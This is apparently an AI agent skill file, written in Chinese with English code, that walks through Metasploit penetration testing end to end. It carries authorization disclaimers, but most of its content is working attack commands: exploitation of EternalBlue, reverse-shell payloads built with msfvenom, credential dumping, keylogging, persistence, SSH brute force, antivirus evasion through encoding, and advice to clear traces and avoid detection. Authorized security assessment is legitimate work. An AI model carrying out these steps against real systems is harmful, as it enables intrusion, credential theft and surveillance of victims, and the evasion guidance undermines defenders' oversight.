---
name: metasploit-framework
description: "⚠️ 仅限授权使用 > 本技能仅供教育目的或授权安全评估使用。 > 使用本工具前必须获得系统所有者的明确书面许可。 > 滥用本工具属于违法行为，严格禁止。当用户要求'渗透测试'、'漏洞利用'、'Metasploit'、'msfconsole'、'msfvenom'、'Meterpreter'、'payload生成'、'后渗透'时使用。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

# Metasploit Framework

> **⚠️ 仅限授权使用**
> 本技能仅供教育目的或授权安全评估使用。
> 使用本工具前必须获得系统所有者的明确书面许可。
> 滥用本工具属于违法行为，严格禁止。

## 用途

利用 Metasploit Framework 进行全面渗透测试，覆盖从初始利用到后渗透的全流程。Metasploit 提供统一平台，支持漏洞利用、payload 生成、辅助扫描，以及在授权安全评估中维持对已渗透系统的访问。

## 前置条件

### 所需工具
```bash
# Metasploit must already be installed before using this skill.
# Kali Linux usually ships with it preinstalled.
msfconsole --version
```

安装方式因操作系统和包源而异。使用本技能前，请按平台文档中的包管理器或厂商安装流程操作，不要依赖本技能中未固定版本的远程安装脚本。

如需数据库支持功能（如工作区追踪），请按本地安装说明初始化 `msfdb`。本技能假定 Metasploit 已可用，且不需要 `sudo`、`systemctl` 等特权级主机设置步骤。

### 所需知识
- 网络与系统基础
- 漏洞与利用原理
- 基本编程概念
- 目标枚举技术

### 所需权限
- 书面测试授权
- 目标系统的网络访问权限
- 明确测试范围和交战规则

运行 exploit 模块前，须让用户确认目标主机、范围和授权状态。

## 产出与交付物

1. **利用证据** - 成功渗透的截图和日志
2. **会话日志** - 命令历史和提取的数据
3. **漏洞映射** - 已利用漏洞及 CVE 编号
4. **后渗透产物** - 凭据、文件和系统信息

## 核心工作流

### 阶段 1：MSFConsole 基础

启动并导航 Metasploit 控制台：

```bash
# Start msfconsole
msfconsole

# Quiet mode (skip banner)
msfconsole -q

# Basic navigation commands
msf6 > help                    # Show all commands
msf6 > search [term]           # Search modules
msf6 > use [module]            # Select module
msf6 > info                    # Show module details
msf6 > show options            # Display required options
msf6 > set [OPTION] [value]    # Configure option
msf6 > run / exploit           # Execute module
msf6 > back                    # Return to main console
msf6 > exit                    # Exit msfconsole
```

### 阶段 2：模块类型

了解不同模块分类：

```bash
# 1. Exploit Modules - Target specific vulnerabilities
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Payload Modules - Code executed after exploitation
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Auxiliary Modules - Scanning, fuzzing, enumeration
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Post-Exploitation Modules - Actions after compromise
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Obfuscate payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - No-operation padding for buffer overflows
msf6 > show nops

# 7. Evasion - Bypass security controls
msf6 > show evasion
```

### 阶段 3：搜索模块

为目标查找合适的模块：

```bash
# Search by name
msf6 > search eternalblue

# Search by CVE
msf6 > search cve:2017-0144

# Search by platform
msf6 > search platform:windows type:exploit

# Search by type and keyword
msf6 > search type:auxiliary smb

# Filter by rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Combined search
msf6 > search type:exploit platform:linux apache

# View search results columns:
# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description
```

### 阶段 4：配置 Exploit

设置 exploit 以便执行：

```bash
# Select exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target host
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Set target port (if different from default)
msf6 exploit(...) > set RPORT 445

# View compatible payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host for reverse connection
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# View all options again to verify
msf6 exploit(...) > show options

# Check if target is vulnerable (if supported)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# or
msf6 exploit(...) > run
```

### 阶段 5：Payload 类型

根据场景选择合适的 payload：

```bash
# Singles - Self-contained, no staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Small payload that downloads larger stage
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Downloaded by stager, provides full functionality
# Meterpreter, VNC, shell

# Payload naming convention:
# [platform]/[architecture]/[payload_type]/[connection_type]
# Examples:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### 阶段 6：Meterpreter 会话

使用 Meterpreter 进行后渗透操作：

```bash
# After successful exploitation, you get Meterpreter prompt
meterpreter >

# System Information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Process Management
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Networking
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Privilege Escalation
meterpreter > getsystem
meterpreter > getprivs

# Credential Harvesting
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots and Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Shell Access
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Background Session
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### 阶段 7：辅助模块

使用辅助模块进行侦察：

```bash
# SMB Version Scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Port Scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# SSH Version Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP Anonymous Login
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# HTTP Directory Scanner
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Brute Force Modules
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

### 阶段 8：后渗透模块

在活跃会话上运行后渗透模块：

```bash
# List sessions
msf6 > sessions -l

# Run post module on specific session
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Or run directly from Meterpreter
meterpreter > run post/windows/gather/hashdump

# Common Post Modules
# Credential Gathering
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# System Enumeration
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Privilege Escalation
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistence
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivoting
post/multi/manage/autoroute
```

### 阶段 9：使用 msfvenom 生成 Payload

创建独立 payload：

```bash
# Basic Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Encoded payload (evade AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List available formats
msfvenom --list formats

# List available encoders
msfvenom --list encoders
```

### 阶段 10：设置监听器

配置监听器接收回连：

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

## 速查表

### MSFConsole 常用命令

| 命令 | 说明 |
|------|------|
| `search [term]` | 搜索模块 |
| `use [module]` | 选择模块 |
| `info` | 显示模块信息 |
| `show options` | 显示可配置选项 |
| `set [OPT] [val]` | 设置选项值 |
| `setg [OPT] [val]` | 设置全局选项 |
| `run` / `exploit` | 执行模块 |
| `check` | 验证目标漏洞 |
| `back` | 取消选择模块 |
| `sessions -l` | 列出活跃会话 |
| `sessions -i [N]` | 交互指定会话 |
| `jobs -l` | 列出后台任务 |
| `db_nmap` | 结合数据库运行 nmap |

### Meterpreter 常用命令

| 命令 | 说明 |
|------|------|
| `sysinfo` | 系统信息 |
| `getuid` | 当前用户 |
| `getsystem` | 尝试提权 |
| `hashdump` | 导出密码哈希 |
| `shell` | 退回系统 shell |
| `upload/download` | 文件传输 |
| `screenshot` | 截屏 |
| `keyscan_start` | 启动键盘记录 |
| `migrate [PID]` | 迁移到其他进程 |
| `background` | 将会话置入后台 |
| `portfwd` | 端口转发 |

### 常用 Exploit 模块

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Web Applications
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

## 约束与限制

### 法律要求
- 仅限自有系统或已获书面授权的系统
- 记录所有测试活动
- 遵守交战规则
- 向相关方报告所有发现

### 技术限制
- 现代 AV/EDR 可能检测到 Metasploit payload
- 部分 exploit 需要特定目标配置
- 防火墙规则可能阻断反向连接
- 并非所有 exploit 适用于所有目标版本

### 行动安全
- 尽量使用加密通道（reverse_https）
- 测试后清理痕迹
- 避免被监控系统检测
- 后渗透操作限于约定范围

## 故障排除

| 问题 | 解决方案 |
|------|----------|
| 数据库未连接 | 运行 `sudo msfdb init`，启动 PostgreSQL，再执行 `db_connect` |
| Exploit 失败/无会话 | 运行 `check`；验证 payload 架构；检查防火墙；尝试其他 payload |
| 会话立即断开 | 迁移到稳定进程；使用 stageless payload；检查 AV；使用 AutoRunScript |
| Payload 被 AV 检测 | 使用编码 `-e x86/shikata_ga_nai -i 10`；使用 evasion 模块；自定义模板 |

## 使用时机
本技能适用于执行概述中描述的工作流或操作。
